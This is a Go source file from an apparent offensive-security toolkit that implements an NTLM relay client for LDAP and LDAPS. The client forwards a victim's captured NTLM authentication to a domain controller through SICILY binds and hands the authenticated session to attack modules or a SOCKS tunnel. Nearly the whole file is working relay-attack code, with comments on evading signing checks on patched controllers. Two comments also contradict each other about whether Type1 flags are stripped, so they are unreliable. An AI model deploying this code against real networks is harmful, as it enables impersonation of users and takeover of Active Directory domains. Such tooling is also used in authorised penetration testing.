// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	ber "github.com/go-asn1-ber/asn1-ber"
	goldap "github.com/go-ldap/ldap/v3"

	"gopacket/internal/build"
	gopacketldap "gopacket/pkg/ldap"
	"gopacket/pkg/transport"
)

// SICILY NTLM bind context tags (Microsoft LDAP extension)
const (
	sicilyDiscoveryTag = 9  // SICILY_PACKAGE_DISCOVERY
	sicilyNegotiateTag = 10 // SICILY_NEGOTIATE_NTLM
	sicilyResponseTag  = 11 // SICILY_RESPONSE_NTLM
)

// LDAP result codes
const (
	ldapResultSuccess              = 0
	ldapResultStrongerAuthRequired = 8
	ldapResultInvalidCredentials   = 49
)

// LDAPRelayClient relays NTLM authentication to an LDAP target via SICILY bind.
// After successful auth, exposes a *goldap.Conn for post-auth LDAP operations.
// Implements the ProtocolClient interface.
type LDAPRelayClient struct {
	targetAddr string
	useTLS     bool
	conn       net.Conn
	messageID  int64
	ldapConn   *goldap.Conn // post-auth LDAP operations
	bound      bool
}

// NewLDAPRelayClient creates a new LDAP relay client for the given target.
func NewLDAPRelayClient(targetAddr string, useTLS bool) *LDAPRelayClient {
	return &LDAPRelayClient{
		targetAddr: targetAddr,
		useTLS:     useTLS,
	}
}

// InitConnection establishes a TCP connection to the LDAP target.
// For LDAPS targets, wraps the connection in TLS.
// Implements ProtocolClient.
func (c *LDAPRelayClient) InitConnection() error {
	rawConn, err := transport.Dial("tcp", c.targetAddr)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %v", c.targetAddr, err)
	}

	if c.useTLS {
		tlsConn := tls.Client(rawConn, &tls.Config{InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return fmt.Errorf("TLS handshake failed: %v", err)
		}
		c.conn = tlsConn
	} else {
		c.conn = rawConn
	}

	c.messageID = 0

	if build.Debug {
		log.Printf("[D] LDAP relay client: connected to %s (TLS: %v)", c.targetAddr, c.useTLS)
	}

	return nil
}

// SendNegotiate performs SICILY package discovery and NTLM negotiate.
// Returns the Type2 challenge from the LDAP server.
// Implements ProtocolClient.
func (c *LDAPRelayClient) SendNegotiate(ntlmType1 []byte) ([]byte, error) {
	// Step 1: SICILY_PACKAGE_DISCOVERY
	if err := c.sendSicilyBind(sicilyDiscoveryTag, nil); err != nil {
		return nil, fmt.Errorf("SICILY discovery send failed: %v", err)
	}

	resultCode, serverCreds, err := c.recvBindResponse()
	if err != nil {
		return nil, fmt.Errorf("SICILY discovery response failed: %v", err)
	}

	if resultCode != ldapResultSuccess {
		return nil, fmt.Errorf("SICILY discovery failed: result code %d", resultCode)
	}

	// Verify NTLM is available
	packages := strings.Split(string(serverCreds), ";")
	ntlmFound := false
	for _, pkg := range packages {
		if strings.TrimSpace(pkg) == "NTLM" {
			ntlmFound = true
			break
		}
	}
	if !ntlmFound {
		return nil, fmt.Errorf("NTLM not found in SICILY packages: %s", string(serverCreds))
	}

	if build.Debug {
		log.Printf("[D] LDAP relay client: SICILY packages: %s", string(serverCreds))
	}

	// Step 2: SICILY_NEGOTIATE_NTLM — send Type1, receive Type2
	// Note: We do NOT modify Type1 flags here. For LDAPS relay to work, the source
	// protocol must not set NEGOTIATE_SIGN/NEGOTIATE_SEAL (HTTP clients don't).
	// SMB→LDAPS is not possible on patched DCs because SMB always sets SIGN,
	// and any modification to Type1 would break the MIC in Type3.
	if c.useTLS && len(ntlmType1) >= 16 {
		type1Flags := binary.LittleEndian.Uint32(ntlmType1[12:16])
		if type1Flags&(ntlmsspNegotiateSign|ntlmsspNegotiateSeal) != 0 {
			log.Printf("[!] Type1 has NEGOTIATE_SIGN/SEAL — LDAPS relay will fail (SMB→LDAPS not supported on patched DCs)")
		}
	}

	if err := c.sendSicilyBind(sicilyNegotiateTag, ntlmType1); err != nil {
		return nil, fmt.Errorf("SICILY negotiate send failed: %v", err)
	}

	resultCode, serverCreds, err = c.recvBindResponse()
	if err != nil {
		return nil, fmt.Errorf("SICILY negotiate response failed: %v", err)
	}

	if resultCode != ldapResultSuccess {
		return nil, fmt.Errorf("SICILY negotiate failed: result code %d", resultCode)
	}

	if len(serverCreds) == 0 {
		return nil, fmt.Errorf("SICILY negotiate: no challenge received")
	}

	if build.Debug {
		log.Printf("[D] LDAP relay client: received Type2 challenge (%d bytes)", len(serverCreds))
	}

	return serverCreds, nil
}

// SendAuth relays the NTLM Type3 authenticate via SICILY_RESPONSE_NTLM.
// On success, creates a goldap.Conn for post-auth LDAP operations.
// Implements ProtocolClient.
func (c *LDAPRelayClient) SendAuth(ntlmType3 []byte) error {
	// Unwrap SPNEGO if the Type3 from the SMB server is SPNEGO-wrapped
	rawType3 := unwrapSPNEGOType3(ntlmType3)

	// Note: SIGN/SEAL flags are handled at the Type1 level in SendNegotiate().
	// By stripping them from Type1 before sending to the DC, the Type2 won't
	// negotiate them, and the victim's Type3 naturally won't include them.
	// This preserves MIC integrity and works on patched DCs.

	if build.Debug {
		dumpLen := 20
		if len(rawType3) < dumpLen {
			dumpLen = len(rawType3)
		}
		log.Printf("[D] LDAP relay client: Type3 for SICILY (%d bytes), header: %x", len(rawType3), rawType3[:dumpLen])
	}

	// Step 3: SICILY_RESPONSE_NTLM — send Type3
	if err := c.sendSicilyBind(sicilyResponseTag, rawType3); err != nil {
		return fmt.Errorf("SICILY response send failed: %v", err)
	}

	resultCode, _, err := c.recvBindResponse()
	if err != nil {
		return fmt.Errorf("SICILY response failed: %v", err)
	}

	switch resultCode {
	case ldapResultSuccess:
		c.bound = true
		if build.Debug {
			log.Printf("[D] LDAP relay client: SICILY NTLM bind succeeded")
		}

		// Don't create goldap.Conn here. goldap.Conn.Start() spawns a persistent
		// reader goroutine that would compete with the SOCKS plugin for socket reads.
		// Impacket avoids this because ldap3 is synchronous (no background threads).
		// Create goldap.Conn lazily in GetSession() — only needed for attack mode.
		return nil

	case ldapResultStrongerAuthRequired:
		if c.useTLS {
			return fmt.Errorf("authentication failed: stronger auth required (even with TLS)")
		}
		return fmt.Errorf("LDAP signing is required — try ldaps:// target instead")

	case ldapResultInvalidCredentials:
		return fmt.Errorf("authentication failed: invalid credentials")

	default:
		return fmt.Errorf("authentication failed: LDAP result code %d", resultCode)
	}
}

// GetSession returns a *gopacketldap.Client wrapping the authenticated connection.
// LDAP attack modules use this for Search, Modify, etc.
// Creates the goldap.Conn lazily on first call (not in SendAuth, to avoid spawning
// a background reader goroutine that would conflict with SOCKS plugin raw reads).
// Implements ProtocolClient.
func (c *LDAPRelayClient) GetSession() interface{} {
	if !c.bound || c.conn == nil {
		return nil
	}
	// Lazily create goldap.Conn — only attack mode calls GetSession,
	// SOCKS mode uses the raw connection for tunneling.
	if c.ldapConn == nil {
		c.ldapConn = goldap.NewConn(c.conn, c.useTLS)
		c.ldapConn.Start()
	}
	client := &gopacketldap.Client{
		Conn: c.ldapConn,
	}
	return client
}

// KeepAlive sends a rootDSE query to keep the session alive.
// In SOCKS mode (ldapConn is nil), uses raw BER on the TCP connection to avoid
// spawning goldap's background reader goroutine. This matches Impacket's approach
// where ldap3 operations are synchronous and don't interfere with SOCKS tunnel reads.
// Implements ProtocolClient.
func (c *LDAPRelayClient) KeepAlive() error {
	if c.ldapConn != nil {
		// Attack mode: use goldap
		sr := goldap.NewSearchRequest("", goldap.ScopeBaseObject, goldap.NeverDerefAliases,
			0, 0, false, "(objectClass=*)", []string{"namingContexts"}, nil)
		_, err := c.ldapConn.Search(sr)
		return err
	}

	if c.conn == nil {
		return fmt.Errorf("no LDAP connection")
	}

	// SOCKS mode: raw BER rootDSE search (no goldap.Conn to avoid background reader)
	c.messageID++
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))

	searchReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 3, nil, "SearchRequest")
	searchReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "baseObject"))
	searchReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, int64(0), "scope"))        // baseObject
	searchReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, int64(0), "derefAliases")) // neverDerefAliases
	searchReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, int64(0), "sizeLimit"))
	searchReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, int64(0), "timeLimit"))
	searchReq.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "typesOnly"))
	// Filter: (objectClass=*)
	searchReq.AppendChild(ber.NewString(ber.ClassContext, ber.TypePrimitive, 7, "*", "present"))
	// Attributes: namingContexts
	attrs := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "attributes")
	attrs.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "namingContexts", ""))
	searchReq.AppendChild(attrs)
	packet.AppendChild(searchReq)

	if _, err := c.conn.Write(packet.Bytes()); err != nil {
		return fmt.Errorf("keepalive write: %v", err)
	}

	// Read response(s) — expect SearchResultEntry + SearchResultDone
	c.conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	defer c.conn.SetReadDeadline(time.Time{})
	for {
		resp, err := ber.ReadPacket(c.conn)
		if err != nil {
			return fmt.Errorf("keepalive read: %v", err)
		}
		if len(resp.Children) >= 2 {
			op := resp.Children[1]
			// SearchResultDone (APPLICATION 5) = we're done
			if op.ClassType == ber.ClassApplication && op.Tag == 5 {
				return nil
			}
		}
	}
}

// Kill terminates the LDAP connection.
// Implements ProtocolClient.
func (c *LDAPRelayClient) Kill() {
	if c.ldapConn != nil {
		c.ldapConn.Close()
	} else if c.conn != nil {
		c.conn.Close()
	}
}

// IsAdmin returns true. For LDAP, privilege depends on the relayed account's ACLs,
// not a binary admin check. Attacks will fail individually if insufficient rights.
// Implements ProtocolClient.
func (c *LDAPRelayClient) IsAdmin() bool {
	return true
}

// sendSicilyBind constructs and sends a SICILY LDAP BindRequest.
// For negotiate (tag 10), the Name field is set to "NTLM";
// for discovery (tag 9) and response (tag 11), the Name field is empty.
// This matches the Microsoft SICILY protocol spec and ldap3 implementation.
func (c *LDAPRelayClient) sendSicilyBind(tag int, data []byte) error {
	c.messageID++

	// LDAP Message (SEQUENCE)
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))

	// Bind Request (APPLICATION 0)
	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))

	// Name field: "NTLM" for negotiate, empty for discovery and response
	// (matches Microsoft SICILY spec and ldap3 implementation)
	name := ""
	if tag == sicilyNegotiateTag {
		name = "NTLM"
	}
	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, name, "Name"))

	// Authentication — SICILY context tag with NTLM data
	if data == nil {
		bindReq.AppendChild(ber.NewString(ber.ClassContext, ber.TypePrimitive, ber.Tag(tag), "", "SICILY Auth"))
	} else {
		bindReq.AppendChild(ber.NewString(ber.ClassContext, ber.TypePrimitive, ber.Tag(tag), string(data), "SICILY Auth"))
	}

	packet.AppendChild(bindReq)

	if build.Debug {
		dataLen := 0
		if data != nil {
			dataLen = len(data)
		}
		log.Printf("[D] LDAP relay client: sending SICILY bind (tag=%d, data=%d bytes)", tag, dataLen)
	}

	_, err := c.conn.Write(packet.Bytes())
	return err
}

// recvBindResponse reads and parses an LDAP BindResponse from the connection.
// Returns the result code and optional serverSaslCreds (Type2 challenge).
func (c *LDAPRelayClient) recvBindResponse() (int64, []byte, error) {
	// Set a read deadline for the response
	c.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer c.conn.SetReadDeadline(time.Time{})

	packet, err := ber.ReadPacket(c.conn)
	if err != nil {
		return -1, nil, fmt.Errorf("failed to read LDAP response: %v", err)
	}

	if len(packet.Children) < 2 {
		return -1, nil, fmt.Errorf("invalid LDAP response: expected at least 2 children, got %d", len(packet.Children))
	}

	// Children[1] = BindResponse (APPLICATION 1)
	bindResp := packet.Children[1]
	if bindResp.ClassType != ber.ClassApplication || bindResp.Tag != 1 {
		return -1, nil, fmt.Errorf("expected BindResponse (APPLICATION 1), got class=%d tag=%d", bindResp.ClassType, bindResp.Tag)
	}

	if len(bindResp.Children) < 3 {
		return -1, nil, fmt.Errorf("invalid BindResponse: expected at least 3 children, got %d", len(bindResp.Children))
	}

	// resultCode (ENUMERATED) — first child
	resultCode, ok := bindResp.Children[0].Value.(int64)
	if !ok {
		return -1, nil, fmt.Errorf("invalid resultCode type: %T", bindResp.Children[0].Value)
	}

	// For SICILY, the response data can be in different locations:
	// - Package discovery: packages are in matchedDN (child[1], OCTET STRING)
	// - NTLM negotiate: Type2 challenge is in serverSaslCreds (CONTEXT tag 7)
	// - NTLM response: no additional data needed
	var serverCreds []byte

	// First try serverSaslCreds (context tag 7) — standard for SASL/Type2 challenge
	for _, child := range bindResp.Children {
		if child.ClassType == ber.ClassContext && child.Tag == 7 {
			serverCreds = child.Data.Bytes()
			break
		}
	}

	// If no serverSaslCreds found, use matchedDN (child[1]) — SICILY discovery uses this
	if len(serverCreds) == 0 && len(bindResp.Children) >= 2 {
		if v, ok := bindResp.Children[1].Value.(string); ok && v != "" {
			serverCreds = []byte(v)
		}
	}

	// Extract diagnosticMessage (child[2], OCTET STRING) for error details
	var diagnosticMsg string
	if len(bindResp.Children) >= 3 {
		if v, ok := bindResp.Children[2].Value.(string); ok {
			diagnosticMsg = v
		}
	}

	if build.Debug {
		log.Printf("[D] LDAP relay client: BindResponse resultCode=%d serverCreds=%d bytes diag=%q", resultCode, len(serverCreds), diagnosticMsg)
	}

	return resultCode, serverCreds, nil
}

// unwrapSPNEGOType3 strips SPNEGO NegTokenResp wrapping from an NTLM Type3 message.
// The Type3 from the SMB server is SPNEGO-wrapped (tag 0xa1); SICILY expects raw NTLM.
func unwrapSPNEGOType3(data []byte) []byte {
	if len(data) == 0 {
		return data
	}

	// Check for SPNEGO NegTokenResp tag (0xa1 = context-specific, constructed, tag 1)
	if data[0] == 0xa1 {
		token, err := decodeNegTokenResp(data)
		if err == nil && len(token) > 0 {
			if build.Debug {
				log.Printf("[D] LDAP relay client: unwrapped SPNEGO from Type3 (%d → %d bytes)", len(data), len(token))
			}
			return token
		}
	}

	// Already raw NTLMSSP
	return data
}
